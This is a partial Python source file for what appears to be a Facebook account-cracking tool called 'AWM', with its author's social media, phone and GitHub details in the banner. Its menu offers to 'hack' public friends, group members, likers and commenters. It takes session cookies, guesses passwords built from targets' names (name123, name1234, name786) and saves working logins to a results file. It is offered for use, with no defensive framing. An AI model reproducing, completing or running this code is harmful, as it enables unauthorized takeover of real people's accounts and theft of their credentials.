# code by Mirwais Danishyar

# my facebook ( https://www.facebook.com/profile.php?id=100013445416151 )
...
def logo():
 ...
 ╚═╝     ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝\n{N} ▌│█║▌║▌║AWM FACEBOOK METHOD║▌║▌║█│▌{N} """)

    print("╔════════════════════════════════════════╗")

    print(f"║{P}[{H}•{P}] Author    : Mirwais Danishyar              {N}║")

    print(f"║{P}[{H}•{P}] Whatsapp  : +93796747343           {N}║")

    print(f"║{P}[{H}•{P}] Github    : github.com/muhammadkhulmi{N}  ║")

    print(f"║{P}[{H}•{P}] AWM Status : Gratis rasa {H}Premium{P}     {N}║")

    print(f"║{P}[{H}•{P}] Support   : 64bit                   {N}║")

    print(f"║{P}[{H}•{P}] Network   : {H}IM3{N}, {H}AXIS/XL{N}, {H}3{N}         ║")

    print(f"║{P}[{H}•{P}] AWM Version: V-5.5 ({K}AWM{P})            {N}║")
...
def yayanxd():
    ...
    try:
    	...
    	___kontol___ = input('[|] Login Cookies : ')
...
def moch_yayan(my_name,my_id):
    ...
    print(' [%s01%s] Hack Public Friends (%sON%s)'%(H,N,H,N));time.sleep(0.03)

    print(' [%s02%s] Random ID  (%sOFF%s)'%(H,N,H,N));time.sleep(0.03)

    print(' [%s03%s] Hack Public Group Member (%sON%s)'%(H,N,H,N));time.sleep(0.03)

    print(' [%s04%s] Hack Like Posts (%sON%s)'%(H,N,H,N));time.sleep(0.03)

    print(' [%s05%s] Hack Comment Posts (%sON%s)'%(H,N,H,N));time.sleep(0.03)
    ...
    print(' [%s08%s] AWM update info'%(H,N));time.sleep(0.03)
...
def log_hasil(user, pasw):
    ...
    if "c_user" in session.cookies.get_dict():
        ...
        open('results/AWM-OK.txt', 'a').write(f"{user} • {pasw}\n")
...
# METODE SANDI MANUAL
    ...
    def plerr(self,id):
        ...
        if ___yayanganteng___ in ('raraY', 'raray'):
            ...
            print(' %s[%s!%s] Use %sExample%s for separator\n [%s•%s] Example : %kabul123%s,%safghan123%s,%s500600'%(N,M,N,H,N,H,N,H,N,H,N,H))
...
# PROSES Hack METODE 3 in 1
    ...
    def kombinasi_pw(self,url):
        ...
        print(' %s[%s3%s] name,name123,name1234,name12345,%s+ADD%s'%(N,H,N,H,N))
        ...
        if pw in[""]:
                ...
                for yntkts in self.id:
                   ...
                   try:
                       ...
                       if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                           ...
                           pwx = [name, xz[0]+"123", xz[0]+"1122", xz[0]+"786", xz[0]+"1234", xz[0]+"12345", xz[0]+xz[1]]
            ...
            print('%s════════════════════════════════════════\n %sADDITION PASSWORD MENU AWM%s'%(N,BM,N))

            #print(" %s[%s!%s] Semakin banyak kombinasi password semakin lama proses crack!"%(N,M,N))

            print(" %s[%s!%s] Use %sExample%s for hacking"%(N,M,N,H,N))

            print(" %s[%s!%s] Example : %kabul123,afghan123,500600%s"%(N,M,N,H,N))
                ...
                for yntkts in self.id:
                   ...
                   try:
                       ...
                       if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                           ...
                           xxx = [name, xz[0]+"123", xz[0]+"1122", xz[0]+"786", xz[0]+"1234", xz[0]+"12345", xz[0]+xz[1]]
